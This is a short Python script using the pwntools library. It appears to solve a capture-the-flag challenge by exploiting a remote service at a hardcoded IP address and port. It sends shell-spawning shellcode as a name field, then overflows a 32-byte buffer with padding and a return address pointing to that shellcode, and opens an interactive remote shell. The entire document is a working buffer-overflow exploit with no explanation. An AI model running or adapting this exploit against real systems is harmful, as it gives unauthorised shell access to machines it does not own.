from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
p = remote('140.110.112.192', 2122)
#buffer 0x20(32)
#rsp = 0x7fffffffe0c0

sc = asm(shellcraft.sh())
print 'size of shellcode:', len(sc)
payload ='\0'*(40) + p64(0x601080) #return to name
p.sendlineafter('Name:', sc)
p.sendlineafter('best:', payload)

p.interactive()
p.close()